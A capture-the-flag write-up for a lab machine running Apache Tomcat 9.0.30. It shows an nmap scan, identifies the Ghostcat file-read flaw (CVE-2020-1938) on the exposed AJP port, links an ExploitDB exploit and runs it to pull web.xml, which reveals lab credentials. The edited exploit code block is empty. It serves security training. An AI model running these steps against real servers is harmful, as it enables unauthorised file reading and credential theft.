# TOMCAT
Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

## Resolution

First, machine scanning
```
$ sudo nmap -sV -sC 10.10.210.249 -Pn -n --disable-arp-ping

Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-21 08:46 CET
Nmap scan report for 10.10.210.249
Host is up (0.041s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 8080 running an Apache Tomcat 9 web server. Navigating there, we found the default page after setup of the server. Additionaly, ajp13 is exposed on port 8009 which, after some research about the two services, might expose a vulnerability named *Ghostcat*:
> Ghostcat is a LFI vulnerability, but somewhat restricted: only files from a certain path can be pulled. Still, this can include files like WEB-INF/web.xml which can leak important information like credentials for the Tomcat interface, depending on the server setup.

CVE of the vulnerability: CVE-2020-1938.\
A potential exploit: [from ExploitDB](https://www.exploit-db.com/exploits/48143).


I tried using the exploit directly and found some (small) issues so here is the edited version:
```Python
```

Using the exploit to get the default file

```
$ ./ajpexp.py -p 8009 10.10.210.249

Getting resource at ajp13://10.10.210.249:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfu*k:8730281lkjlkjdqlksalks
  </description>

</web-app>
```
